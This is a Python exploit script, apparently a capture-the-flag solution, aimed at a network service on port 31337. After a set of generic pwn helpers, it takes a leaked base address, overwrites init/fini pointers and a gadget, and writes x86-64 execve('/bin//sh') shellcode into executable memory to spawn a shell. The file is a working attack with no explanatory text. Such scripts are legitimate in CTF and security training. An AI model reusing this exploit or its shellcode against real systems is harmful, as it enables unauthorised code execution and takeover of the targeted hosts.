#!/usr/bin/env python3

import struct
import socket
import select
import sys
import time
import binascii
import os
import math
import re
import hashlib
import telnetlib
import base64
import random
import string
import itertools
import ctypes
import traceback

try:
    ctypes.cdll.LoadLibrary("libc.so.6")
    libc = ctypes.CDLL("libc.so.6")
except:
    pass

alphanum = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'

class brute(object):
    def __init__(self, chars, n):
        self.chars = chars
        self.n = n
        self.state = [0 for i in range(n)]
        self.atend = False

    def __iter__(self):
        return self

    def next(self):
        if self.atend:
            raise StopIteration()
        res = [self.chars[self.state[i]] for i in range(self.n)]
        for i in range(self.n):
            self.state[i] += 1;
            if self.state[i] == len(self.chars):
                self.state[i] = 0
            else:
                return ''.join(res)
        self.atend = True
        return ''.join(res)

def demo_brute(vals, n, check_func):
    for v in itertools.product(vals, repeat=n):
        if check_func(v):
            return ''.join(v)

def demo_perms(vals, check_func):
    for v in itertools.permutations(vals):
        if check_func(v):
            return ''.join(v)

def rnd_string(sz, alpha=alphanum):
    res = ''
    for i in range(sz):
        res += alpha[random.randrange(0, len(alpha))]
    return res

def c_srand(seed):
    libc.srand(seed)

def c_rand():
    return libc.rand()

def c_time(t):
    return libc.time(t)

def p(f, *args):
    return struct.pack(f, *args).decode("latin1")

p32 = lambda x: p("<I", x)
p64 = lambda x: p("<Q", x)
enc = lambda x: x.encode("latin1")
dec = lambda x: x.decode("latin1")

def u(f, v):
    if type(v) == str:
        v = enc(v)
    return struct.unpack(f, v)

u32 = lambda x: u("<I", x.ljust(4, '\x00')[:4])[0]
u64 = lambda x: u("<Q", x.ljust(8, '\x00')[:8])[0]

def hx(s):
    if type(s) == str:
        s = enc(s)
    return binascii.hexlify(s)

def ux(s):
    return binascii.unhexlify(s)

def read_until(s, content, echo = True):
    if type(content) == str:
        content = [content]
    x = ""
    while True:
        y = s.recv(1)
        if not y:
            return False
        x += dec(y)
        for v in content:
            if x.endswith(v):
                if echo:
                    sys.stderr.write(x)
                return x

def ru(s, txt, echo = True):
    return read_until(s, [txt], echo)

def rl(s, echo = True):
    return ru(s, '\n', echo)

def send_after(s, txt, data, echo = True):
    ru(s, txt, echo)
    if type(data) == str:
        data = enc(data)
    s.send(data)

sa = lambda x,y,z: send_after(x, y, z)

def _interact(s):
    done = False
    while not done:
        rlist, wlist, elist = select.select([sys.stdin, s], [], [])
        for r in rlist:
            if r == sys.stdin:
                b = sys.stdin.readline()
                if b is None or len(b) == 0:
                    done = True
                    break
                b = b.rstrip() + '\n'
                s.send(enc(b))
            else:
                b = s.recv(1)
                if b is None or len(b) == 0:
                    done = True
                    break
                else:
                    sys.stdout.write(dec(b))
                    sys.stdout.flush()

def make_chain(rop, is64 = True):
    if is64:
        return p("<%dQ" % len(rop), *rop)
    else:
        return p("<%dI" % len(rop), *rop)

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

target = (HOST, PORT)

s = socket.socket()
s.connect(target)


#DO THE FUN STUFF HERE

shellcode = \
   "\x31\xc0\x50\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x54\x5f" + \
   "\x50\x54\x5a\x57\x54\x5e\xb0\x3b\x0f\x05"

wr = 0x1500
rd = 0x1610
mprot = 0x16A0


b = s.recv(8)
base = u("<Q", b)[0]
#print("0x%x" % base)

init_1 = base + 0x4330

rwx = base + 0x1370

tail = base + 0x2140

fini = base + 0x4338

wr = base + 0x1500
rd = base + 0x1610
mprot = base + 0x16A0

gadg = base + 0x2000

rando = base + 0x45C4

s.send(struct.pack("<QQ", init_1, rwx))
s.send(struct.pack("<QQ", fini, gadg))
s.send(struct.pack("<QQ", rando, 0))
s.send(struct.pack("<Q", 0))

s.send(b"\x00\x00\x00\x00")

s.recv(9)
b = s.recv(8)
for b in shellcode:
    s.send(struct.pack("<QQ", tail, ord(b)))
    tail += 1
s.send(struct.pack("<Q", 0))
s.send("./submitter\n".encode("latin1"))
print(rl(s))

s.close()
